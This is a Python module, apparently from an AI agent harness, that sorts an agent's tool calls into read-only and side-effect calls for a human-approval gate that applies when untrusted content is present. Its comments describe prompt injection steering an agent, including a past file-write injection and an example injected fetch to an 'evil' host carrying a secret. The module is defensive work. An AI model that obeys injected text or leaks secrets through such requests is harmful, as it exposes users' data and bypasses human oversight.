"""ms-169 e-6236 — effect-based tool classification.

The ms-169 A gate (e-6237, a PreToolUse hook) must decide, for any tool the AI is
about to call, whether that tool has a *side effect* — it changes state or sends
something outward — because those are the calls that must pause for human
approval when untrusted content (see ``untrusted_frame``) is live in the turn.

The gate target is defined by **effect, not by tool family** (ms-169 方針3): a
local ``Write`` / ``Bash`` is dangerous, but an MCP tool that emails / posts to
Slack / writes Salesforce, or a Skill that sends a DM / posts to Discord /
deploys, is *more* outward and destructive. So this module classifies by what a
call DOES, across built-in tools, ``mcp__server__tool`` names, and Skills alike.

Fail-closed / default-deny (方針3): the ONLY calls classified read-only are ones
we can positively recognise as read-only (a built-in reader, or a name whose
verb is a known read verb with no write verb present). Everything else — an
unknown tool, a name with no recognisable verb, or any name carrying a write
verb — is a side effect (gate target). "When in doubt, gate."

This module is pure classification: it holds NO policy about *when* to gate (that
is the untrusted-turn condition, owned by e-6237), performs no I/O, and imports
nothing from Beacon. It answers one question: "is this call read-only or a side
effect?"

Dependency direction (ms-180): ``tool_ledger`` imports THIS module — it derives
its pinned-tool set from ``BUILTIN_SIDE_EFFECT`` rather than copying it — and this
module imports nothing back. A caller that wants the ledger's declaration to win
translates it first (``tool_ledger.gate_classification``) and passes the result as
``declared``.
"""

from __future__ import annotations

import re

READ_ONLY = "read-only"
SIDE_EFFECT = "side-effect"

# Built-in Claude Code / Codex tools we can positively call read-only: they only
# observe local state and reach nothing outward. Exact-name match.
BUILTIN_READ_ONLY = frozenset({
    "Read",
    "Grep",
    "Glob",
    "LS",
    "NotebookRead",
    "TodoRead",
    "WebSearch",  # query to the configured search provider; no arbitrary sink
})

# Built-in tools that are always side effects regardless of arguments.
#   * Write / Edit / MultiEdit / NotebookEdit — mutate files.
#   * Bash — arbitrary command execution (the original ocean.txt injection ran
#     through a file write; Bash is the widest side-effect surface of all).
#   * WebFetch — issues a request to an ARBITRARY url, so it doubles as an
#     outward exfiltration channel (an injected「fetch https://evil/?x=<secret>」
#     leaks data even though it "reads"). Fail-closed → side effect.
#   * Task / Agent — spawns a subagent whose prompt could be steered by the
#     untrusted content; its downstream effects are unbounded. Default-deny.
BUILTIN_SIDE_EFFECT = frozenset({
    "Write",
    "Edit",
    "MultiEdit",
    "NotebookEdit",
    "Bash",
    "WebFetch",
    "Task",
    "Agent",
})

# Verb tokens that mark a WRITE / outward effect. Checked BEFORE read verbs so a
# mixed name (e.g. ``get_or_create_label``) classifies by its strongest effect.
WRITE_VERBS = frozenset({
    "send", "create", "write", "delete", "post", "update", "dml", "add",
    "remove", "modify", "move", "copy", "share", "trash", "upload", "insert",
    "append", "set", "edit", "reply", "draft", "execute", "run", "manage",
    "revoke", "grant", "deploy", "publish", "cancel", "accept", "decline",
    "respond", "join", "leave", "mark", "flag", "forward", "restore",
    "duplicate", "merge", "protect", "hide", "rename", "replace", "apply",
    "sync", "install", "mint", "issue", "approve", "reject", "clear", "done",
    "start", "stop", "halt", "resume", "put", "patch", "drop", "alter",
    "download",  # writes a local file from a remote source
})

# Verb tokens that mark a pure READ. Only honoured when NO write verb is present.
READ_VERBS = frozenset({
    "get", "list", "read", "search", "show", "describe", "view", "find",
    "query", "status", "about", "history", "replies", "unreads", "scopes",
    "info", "check", "detail", "details", "preview", "count",
})

# Split a tool / action name into lowercase verb tokens. Handles snake_case,
# kebab-case, dotted names, and camelCase (``listEvents`` → list, events).
_CAMEL_BOUNDARY = re.compile(r"(?<=[a-z0-9])(?=[A-Z])")
_SEP = re.compile(r"[^A-Za-z0-9]+")


def _tokens(name: str) -> list[str]:
    spaced = _CAMEL_BOUNDARY.sub(" ", str(name or ""))
    parts = _SEP.sub(" ", spaced).split()
    return [p.lower() for p in parts if p]


def _classify_by_verb(name: str) -> str:
    """Verb heuristic: write verb → side-effect, else read verb → read-only,
    else default-deny (side-effect). Write is checked first so the strongest
    effect wins on a mixed name."""
    toks = set(_tokens(name))
    if toks & WRITE_VERBS:
        return SIDE_EFFECT
    if toks & READ_VERBS:
        return READ_ONLY
    return SIDE_EFFECT  # no recognisable verb → default-deny


def has_write_verb(name: str) -> bool:
    """True when ``name`` carries a token from ``WRITE_VERBS``.

    A POSITIVE signal that the call writes or sends — as opposed to the absence
    of a read verb, which is merely unknown. ``tool_ledger`` consumes this to
    refuse a ``read-only`` declaration that contradicts it (ms-180 e-7003
    受入条件3: the ledger must not pass a lie), while leaving a name with no
    recognisable verb fully declarable, since there a declaration replaces a
    guess instead of overriding evidence.

    For an ``mcp__server__tool`` name only the TOOL segment is considered, the
    same part ``classify_tool`` classifies — otherwise a server whose NAME
    contains a write verb (``mcp__google-drive__read_file``: ``drive`` is not a
    verb, but a hypothetical ``mcp__updater__get_status`` would be) would make
    every one of its read tools undeclarable.
    """
    if not isinstance(name, str) or not name.strip():
        return False
    target = name.strip()
    if target.startswith("mcp__"):
        target = target.split("__", 2)[2] if target.count("__") >= 2 else ""
        if not target:
            return False
    return bool(set(_tokens(target)) & WRITE_VERBS)


def ledger_name(tool_name, tool_input) -> str:
    """The name the TOOL LEDGER identifies this call by.

    Both tool-call interrupts ask the ledger about a call — the PreToolUse gate
    asks what the tool DOES, the PostToolUse recorder asks whether using it
    leaves a record — and both used the harness's ``tool_name`` verbatim. For
    every tool but one that is the same string the operator registers. The
    exception is a Skill: the harness names the call ``Skill`` and carries the
    skill in ``tool_input``, so a Skill registered WITH a record sink produced
    no record and was debited as "`Skill` is not in the ledger", while
    registering the literal name ``Skill`` recorded "Skill を使用" and lost which
    skill it was. That is the "listed, and then silently not recorded" shape
    this milestone exists to remove, in the very class of 道具 its background
    names first (``~/.claude/skills``, ``/review``).

    One definition, both callers: the parsing is ``_skill_name``'s, already
    written for the effect heuristic — a second parser here could disagree with
    it about the same payload.

    When the skill cannot be read out of the payload, the bare ``Skill`` is
    returned rather than "": an unreadable call is then debited under a name a
    human can see, instead of being dropped for having no name at all.
    """
    name = tool_name.strip() if isinstance(tool_name, str) else ""
    if name == "Skill":
        return _skill_name(tool_input) or name
    return name


def _skill_name(tool_input) -> str:
    """Extract the skill name from a Skill tool invocation's input.

    The Skill tool carries the target skill in ``skill`` (Claude Code) or as the
    first token of ``command`` (leading slash tolerated). Returns "" if none
    found — the caller then falls back to default-deny on the bare "Skill" name.
    """
    if not isinstance(tool_input, dict):
        return ""
    skill = tool_input.get("skill") or tool_input.get("name")
    if isinstance(skill, str) and skill.strip():
        return skill.strip()
    command = tool_input.get("command")
    if isinstance(command, str) and command.strip():
        first = command.strip().split()[0]
        return first.lstrip("/")
    return ""


def classify_tool(tool_name: str, tool_input: object = None,
                  declared: str = "") -> str:
    """Return ``READ_ONLY`` or ``SIDE_EFFECT`` for one tool invocation.

    Resolution order:
      0. ``declared`` — an ALREADY-TRANSLATED answer (``READ_ONLY`` /
         ``SIDE_EFFECT``) from the tool ledger, when the caller supplies one
         (ms-180 e-7003). A declaration beats a guess; that is the whole point of
         the ledger. Produce it with ``tool_ledger.gate_classification(ledger,
         name)``, which applies the guard that refuses to answer ``read-only``
         for the built-ins the ms-169 approval gate depends on — so no row can
         soften them.

         Why a pre-translated STRING rather than the ledger itself: this module
         must not import ``tool_ledger``. ``tool_ledger`` imports THIS module (it
         derives its pinned-tool set from ``BUILTIN_SIDE_EFFECT``), so taking a
         ledger here meant reaching back the other way, which only worked because
         the import was hidden inside the function body. That is a real cycle with
         its crash deferred to call time: hoisting that lazy import to the top —
         an utterly ordinary cleanup — raised ``partially initialized module``
         from tool_ledger's file, nowhere near the edit. An independent
         maintainability review of PR #802 reproduced exactly that, and the
         comment here used to claim the pair was "acyclic". It is acyclic NOW,
         because the dependency genuinely runs one way only.
      1. Skill tool → classify the *invoked skill* by its verb tokens
         (``beacon-dm-send`` → send → side-effect). A Skill with no resolvable
         name is default-deny.
      2. Exact built-in read-only / side-effect tables.
      3. ``mcp__server__tool`` → verb heuristic on the tool segment (after the
         last ``__``); MCP writes (send/create/update/dml/…) gate, MCP reads
         (get/list/search/…) pass, unknown MCP verb default-denies.
      4. Any other name → verb heuristic (covers generic / future tools).

    Steps 1-4 are UNCHANGED and remain the answer whenever the ledger is absent or
    silent, so an unregistered tool keeps the old fail-closed behaviour exactly
    (ms-180 受入条件6: 台帳に無い道具は従来どおり安全側).

    Fail-closed everywhere: an empty / non-string name is a side effect.
    """
    if not isinstance(tool_name, str) or not tool_name.strip():
        return SIDE_EFFECT
    name = tool_name.strip()

    if declared in (READ_ONLY, SIDE_EFFECT):
        return declared

    if name == "Skill":
        skill = _skill_name(tool_input)
        return _classify_by_verb(skill) if skill else SIDE_EFFECT

    if name in BUILTIN_READ_ONLY:
        return READ_ONLY
    if name in BUILTIN_SIDE_EFFECT:
        return SIDE_EFFECT

    if name.startswith("mcp__"):
        # mcp__<server>__<tool[__…]>: classify by the tool segment. Guard the
        # degenerate ``mcp__server`` (no tool segment) as default-deny.
        segment = name.split("__", 2)[2] if name.count("__") >= 2 else ""
        return _classify_by_verb(segment) if segment else SIDE_EFFECT

    return _classify_by_verb(name)


def is_side_effect(tool_name: str, tool_input: object = None,
                   declared: str = "") -> bool:
    """True when the call changes state or sends outward (= a gate target).

    ``declared`` is optional and defaults to "", so every existing caller keeps
    the pure-heuristic behaviour until it chooses to pass a ledger answer
    (see ``tool_ledger.gate_classification``)."""
    return classify_tool(tool_name, tool_input, declared) == SIDE_EFFECT


__all__ = [
    "READ_ONLY",
    "SIDE_EFFECT",
    "BUILTIN_READ_ONLY",
    "BUILTIN_SIDE_EFFECT",
    "WRITE_VERBS",
    "READ_VERBS",
    "classify_tool",
    "ledger_name",
    "has_write_verb",
    "is_side_effect",
]
